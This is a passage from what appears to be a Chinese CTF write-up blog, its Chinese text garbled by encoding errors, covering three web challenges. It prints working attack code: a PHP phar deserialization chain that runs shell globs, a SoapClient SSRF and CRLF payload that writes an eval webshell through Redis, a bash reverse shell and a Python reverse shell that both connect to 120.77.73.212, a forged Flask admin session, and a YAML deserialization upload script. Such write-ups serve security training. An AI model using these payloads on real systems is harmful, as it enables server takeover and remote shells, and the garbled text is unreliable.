(è¿™é‡Œå¸ˆå‚…å†™çš„æ˜¯/bashï¼Œä½†æ˜¯æˆ‘æµ‹è¯•æ—¶æ˜¯ä¸å¯ä»¥çš„ï¼Œ/shæ˜¯å¯ä»¥çš„)</span></span><br><span class="line">ls /</span><br></pre></td></tr></table></figure><p>çš„æ–‡ä»¶ï¼Œç„¶åé‡æ–°ç™»å½•ä¸€ä¸ªåä¸º<code>. ./*</code>çš„ç”¨æˆ·ä¸Šä¼ pharæ–‡ä»¶ï¼Œè§¦å‘ååºåˆ—åŒ–è¦†ç›–Test-&gt;$valueçš„å€¼ä¸º<code>. ./*</code>,ä»è€Œæ‰§è¡Œ<code>system(&#39;. ./*&#39;)</code>,å®é™…ä¸Šæ˜¯<code>ls /</code></p></blockquote><p>åŸç†å¦‚ä¸‹</p><p>shellä¸­<code>./*</code>ä¼šå°†ç›®å½•ä¸‹çš„æŒ‰å­—å…¸æ’åºçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶å½“ä½œshellè„šæœ¬æ‰§è¡Œ.</p><p><img src="/../images/image-20221027144023202-1687419303717.png" alt="image-20221027144023202"></p><p>è§£é¢˜</p><p><strong>ç»•è¿‡Test::wakeupï¼Œä½¿å¾—Test-&gt;valueçš„å€¼ä¸ºæˆ‘ä»¬æƒ³è¦çš„ã€‚</strong></p><p>è¿™é‡Œæ¶‰åŠåˆ°äº†ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><blockquote><p>åœ¨phpé‡Œ&amp;ç›¸å½“äºä¸¤ä¸ªå˜é‡éƒ½æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œä¿®æ”¹ä¸€ä¸ªä¼šå½±å“åˆ°å¦ä¸€ä¸ªã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221026153815014-1687419303718.png" alt="image-20221026153815014"></p><p>æ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯æ§å˜é‡ï¼Œç„¶åè®©<code>Test-&gt;value =  &amp;å˜é‡</code>ï¼Œè¿™æ ·<code>Test-&gt;value</code>å°±æ˜¯å¯æ§çš„äº†ã€‚</p><p>åœ¨User::wakeupä¸­</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ç™»å½•æ—¶çš„ç”¨æˆ·åæ¥æ§åˆ¶<code>Test-&gt;value</code>çš„å€¼ã€‚</p><p>è¿™é‡Œè´´ä¸Šå¸ˆå‚…çš„payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//$b-&gt;username=new Test(); è¿™ä¸ªä¸éœ€è¦</span></span><br><span class="line"><span class="comment">//åŒæ—¶ååºåˆ—åŒ–Userå’ŒTestç±»</span></span><br><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br><span class="line"></span><br><span class="line"><span class="comment">//unlink(&quot;SKI12.phar&quot;);</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;SKI12.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜è¦æ³¨æ„</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯Testç±»å…ˆå®Œæˆååºåˆ—åŒ–ï¼ŒUserç±»åå®Œæˆååºåˆ—åŒ–ï¼Œè¿™æ ·æ‰èƒ½å¤Ÿç»•è¿‡Test::wakeup.</p><p>ç„¶åæŒ‰ç…§ä¸Šé¢æ€»ç»“çš„æ­¥éª¤å°±å¯ä»¥äº†ã€‚</p><p>è´´ä¸Šæˆ‘å¤ç°æˆåŠŸçš„å›¾</p><p><img src="/../images/image-20221027150538141-1687419303719.png" alt="image-20221027150538141"></p></li><li><p>å®˜æ–¹wp</p><blockquote><p>æ€»ç»“ï¼šå…ˆå†™å…¥ä¸€ä¸ªæ–‡ä»¶åä¸ºcatçš„æ–‡ä»¶ï¼Œå†åˆ©ç”¨pharååºåˆ—åŒ–è¦†ç›–<code>Test-&gt;$value</code>çš„å€¼ä¸º<code>* /*</code>ï¼Œä»è€Œæ‰§è¡Œ<code>system(&#39;* /*&#39;)</code>,å®é™…ä¸Šæ˜¯<code>cat /*</code></p></blockquote><p>åŸç†å¦‚ä¸‹</p><p>shellä¸­å•ç‹¬ä¸€ä¸ª<code>*</code>ä¼šå°†ç›®å½•ä¸‹çš„æ–‡ä»¶åæŒ‰ç…§å­—å…¸æ’åºæ‹¼æ¥æˆå‘½ä»¤ï¼Œç¬¬ä¸€ä¸ªæ–‡ä»¶åä½œä¸ºå‘½ä»¤ï¼Œå…¶ä»–æ–‡ä»¶åä½œä¸ºå‘½ä»¤å‚æ•°ã€‚</p><p><img src="/../images/image-20221017102117317-1687419303719.png" alt="image-20221017102117317"></p><ul><li>å†™å…¥æ–‡ä»¶</li></ul><p>ç”¨æˆ·åä¸ºæ•°ç»„ç»•è¿‡User::destructä¸­çš„å¼±æ¯”è¾ƒï¼Œä»è€Œç»•è¿‡User::wakeupï¼ŒåŒæ—¶è§¦å‘Test::tostringç±»ï¼Œä»è€Œå†™å…¥æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”¨æˆ·å</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼±æ¯”è¾ƒ</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">User-&gt;username = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br></pre></td></tr></table></figure><ul><li><p>æ‰§è¡Œå‘½ä»¤</p><p>ä¸ä¸Šä¸€ä¸ªæ€è·¯ä¸€è‡´ã€‚</p></li></ul></li></ol><p>éé¢„æœŸè§£</p><p>ç›´æ¥è¯»å–æ ¹ç›®å½•ä¸‹çš„start.shã€‚ã€‚ã€‚</p><h2 id="EasyLoveâ€“å¤ç°"><a href="#EasyLoveâ€“å¤ç°" class="headerlink" title="EasyLoveâ€“å¤ç°"></a>EasyLoveâ€“å¤ç°</h2><p>åŸç”Ÿç±»SoapClientå‘é€SSRFè¯·æ±‚+CRLFæ¼æ´+redisæ¼æ´</p><p>è®¿é—®hint.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/var/www/html/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hint</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hint</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$hint</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hint</span> = <span class="string">&quot;My favorite database is Redis and My favorite day is 20220311&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çŸ¥é“å¯†ç çš„redis</p><p>å®¡è®¡ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newnewnew</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>newäº†ä¸€ä¸ªç±»ï¼Œå¹¶ä¸”è°ƒç”¨äº†è¿™ä¸ªç±»çš„getflag()æ–¹æ³•ï¼Œå†åŠ ä¸Šæ˜¯redisï¼Œå¾ˆæ˜æ˜¾æ˜¯SoapClientç±»ã€‚</p><p>payload</p><blockquote><p>ä½ç‰ˆæœ¬çš„Redisä¼šå°†httpè¯·æ±‚çš„è¯·æ±‚å¤´å†…å®¹ä½œä¸ºrediså‘½ä»¤è§£æ</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;AUTH 20220311&quot;</span>;</span><br><span class="line"><span class="variable">$poc1</span>=<span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$poc2</span>=<span class="string">&quot;SET x &#x27;&lt;?@eval(\$_POST[1]);?&gt;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$poc3</span>=<span class="string">&quot;CONFIG SET dbfilename shell.php&quot;</span>;</span><br><span class="line"><span class="variable">$poc4</span>=<span class="string">&quot;SAVE&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span> =&gt;</span><br><span class="line"><span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc1</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc2</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc3</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc4</span>.<span class="string">&#x27;^^&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span> = <span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$swpu</span> = <span class="keyword">new</span> <span class="title function_ invoke__">swpu</span>();</span><br><span class="line"><span class="variable">$swpu</span>-&gt;l61q4cheng = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$swpu</span>));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221027164155928-1687419303719.png" alt="image-20221027164155928"></p><p>åå¼¹shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(%<span class="number">22</span>bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F120.77.73.212%2F2333%200%3E%261&#x27;</span>%<span class="number">22</span>)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><p>SUIDææƒ</p><p><img src="/../images/image-20221027165218664-1687419303719.png" alt="image-20221027165218664"></p><h2 id="BlogSystemâ€“å¤ç°"><a href="#BlogSystemâ€“å¤ç°" class="headerlink" title="BlogSystemâ€“å¤ç°"></a>BlogSystemâ€“å¤ç°</h2><p>ä¿¡æ¯æ”¶é›†ï¼Œåœ¨æ–‡ç« ä¸­å‡ºç°äº†keyï¼Œå°è¯•æ„é€ session</p><p><img src="/../images/image-20221104151224136-1687419303719.png" alt="image-20221104151224136"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS E:\scripts\web\flask&gt; python flask-session.py encode -s <span class="string">&#x27;7his_1s_my_fav0rite_ke7&#x27;</span> -t <span class="string">&quot;&#123;&#x27;_permanent&#x27;: True, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.Y2S-xQ.V9-DZaiArnzERULY9NHBYf3WL6s</span><br></pre></td></tr></table></figure><p>ä¼ªé€ åèº«ä»½ä¸ºadmin,å¤šäº†ä¸€ä¸ªä¸‹è½½åŠŸèƒ½ã€‚</p><p><img src="/../images/image-20221105124636999-1687419303719.png" alt="image-20221105124636999"></p><p>å¯ä»¥çŒœæµ‹åç«¯æ˜¯ä½¿ç”¨äº†<code>os.path.join()</code>æ¥è¿æ¥pathå‚æ•°ã€‚</p><p>è¿™é‡Œå°è¯•ç›®å½•ç©¿è¶Šï¼Œå¸ˆå‚…æ˜¯å°è¯•å¹¶çŒœæµ‹å‡ºåç«¯çš„è¯­å¥æ˜¯<code>.replace(&#39;..&#39;, &#39;&#39;).replace(&#39;//&#39;, &#39;&#39;)</code></p><p>å…¶å®ä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨<code>os.path.join(path,path1)</code>çš„æ¼æ´ï¼Œåªè¦æ‹¼æ¥çš„è·¯å¾„path1æ˜¯ç»å¯¹è·¯å¾„ï¼Œå°±ä¼šå¿½ç•¥æ‰pathã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(<span class="string">&#x27;/tmp&#x27;</span>, <span class="string">&#x27;/home/khaz&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/home/khaz&#x27;</span></span><br></pre></td></tr></table></figure><p>è¯»å–app.pyæºç </p><p><img src="/../images/image-20221105130144960-1687419303719.png" alt="image-20221105130144960"></p><p>å¯¼å…¥äº†<strong>config</strong> <strong>model</strong> <strong>view</strong>ï¼Œå…¸å‹çš„MVTç»“æ„</p><p><img src="/../images/image-20221105141455843-1687419303719.png" alt="image-20221105141455843"></p><p>å°è¯•è®¿é—®<code>/app/view.py</code>æ— æœï¼Œè®¿é—®<code>/app/view/__init__.py</code>,å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .index <span class="keyword">import</span> index</span><br><span class="line"><span class="keyword">from</span> .blog <span class="keyword">import</span> blog</span><br></pre></td></tr></table></figure><p>è¯»å–æºç  index.py blog.py</p><p>å…³é”®éƒ¨åˆ†</p><ul><li>waf</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line"> Â  Â <span class="keyword">if</span> re.search(<span class="string">r&#x27;apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)&#x27;</span>, <span class="built_in">str</span>(data), re.M | re.I):</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> Â  Â <span class="keyword">else</span>:</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><ul><li>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment"># è¿˜è®°å¾—app.pyæ³¨å†Œäº†è“å›¾ï¼Œæ‰€ä»¥è·¯ç”±ä¸º/blog/imgUpload</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():</span><br><span class="line"> Â  Â <span class="keyword">try</span>:</span><br><span class="line"> Â  Â  Â  Â file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)</span><br><span class="line"> Â  Â  Â  Â fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> Â  Â  Â  Â filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)</span><br><span class="line"> Â  Â  Â  Â file.save(filePath)</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> &#123;</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;</span>,</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath</span><br><span class="line"> Â  Â  Â   &#125;</span><br><span class="line"> Â  Â <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> &#123;</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span></span><br><span class="line"> Â  Â  Â   &#125;</span><br></pre></td></tr></table></figure><ul><li>è¯»å–æ–‡ä»¶åŠŸèƒ½ç‚¹</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@admin_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():</span><br><span class="line"> Â  Â <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):</span><br><span class="line"> Â  Â  Â  Â file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">try</span>:</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â f = f.read()</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">if</span> waf(f):</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="built_in">print</span>(yaml.load(f, Loader=Loader))</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šå½“ä½ çœ‹åˆ°è¿™å¥è¯æ—¶ï¼Œè¿˜æ²¡æœ‰æ‹¿åˆ°flagï¼Œé‚£å°±èµ¶ç´§é‡å¼€ç¯å¢ƒå§&#x27;</span>)</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">else</span>:</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šä½ è¯´å¾—ä¸å¯¹&#x27;</span>)</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼š&#x27;</span>+<span class="built_in">str</span>(e))</span><br><span class="line"> Â  Â <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"> Â  Â  Â  Â <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"> Â  Â  Â  Â  Â  Â sayings = yaml.load(f, Loader=Loader)</span><br><span class="line"> Â  Â  Â  Â  Â  Â saying = random.choice(sayings)</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹ï¼Œä¼šç”¨yaml.loadå‡½æ•°æ¥åŠ è½½æ–‡ä»¶ï¼ˆå¯æ§ï¼‰ï¼Œé…åˆæ–‡ä»¶ä¸Šä¼ å¯ä»¥é€ æˆyamlååºåˆ—åŒ–æ¼æ´</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(yaml.load(f, Loader=Loader))</span><br></pre></td></tr></table></figure><p><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">yamlååºåˆ—åŒ–æ¼æ´</a></p><p>æ ¹æ®ä¸Šé¢æ–‡ç« ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸€ä¸ªpoc.yaml</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!!python/module:static.upload</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ª<code>__init__.py</code>æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,pty,socket;s=socket.socket();s.connect((<span class="string">&quot;120.77.73.212&quot;</span>,<span class="number">2333</span>));[os.dup2(s.fileno(),f)<span class="keyword">for</span> f <span class="keyword">in</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)];pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ–‡ä»¶è„šæœ¬</p><p>éœ€è¦æ³¨æ„çš„æ˜¯<code>imgUpload()</code>ä¸­<code>file = request.files.get(&#39;editormd-image-file&#39;)</code>ä»¥åŠå¸¦ä¸Šsession</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1aef01d5-e675-4e45-9357-2524a3e5c570.node4.buuoj.cn:81/blog/imgUpload&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123; name : (æ–‡ä»¶å,æ–‡ä»¶å†…å®¹ï¼Œæ–‡ä»¶MIME)  &#125;  å°†æ–‡ä»¶ä¿¡æ¯å¡«å…¥å…ƒç»„ï¼ˆï¼‰ä¸­ï¼Œåªæœ‰æ–‡ä»¶å†…å®¹æ˜¯å¿…é€‰çš„ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¼ æœ¬åœ°æ–‡ä»¶</span></span><br><span class="line"><span class="comment">#files = &#123;&quot;editormd-image-file&quot;: (&quot;__init__.py&quot;, open(&#x27;E:\scripts\poc.py&#x27;, &#x27;rb&#x27;))&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›´æ¥ä¸Šä¼ æ–‡ä»¶å†…å®¹å­—ç¬¦ä¸²ï¼ˆæ³¨æ„è¦ç”¨äºŒè¿›åˆ¶ï¼‰</span></span><br><span class="line">files = &#123;<span class="string">&quot;editormd-image-file&quot;</span>: (<span class="string">&quot;poc.yaml&quot;</span>, <span class="string">b&#x27;!!python/module:static.upload&#x27;</span>)&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># bpä»£ç†</span></span><br><span class="line">pro = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8011&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;direction&#x27;</span>:<span class="string">&#x27;upload&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span> : <span class="string">&#x27;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.Y2S-xQ.V9-DZaiArnzERULY9NHBYf3WL6s&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,files=files,proxies=pro,cookies=cookie,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221105135517382-1687419303719.png" alt="image-20221105135517382"></p><p>ç„¶åæœåŠ¡å™¨ç›‘å¬ç«¯å£ï¼Œè®¿é—®<code>/blog/saying?path=static/upload/poc.yaml</code>å³å¯</p><p><img src="/../images/image-20221105135258653-1687419303719.png" alt="image-20221105135258653"></p><h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><h2 id="å¼ºç½‘æ¯2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯2019-éšä¾¿æ³¨" class="headerlink" 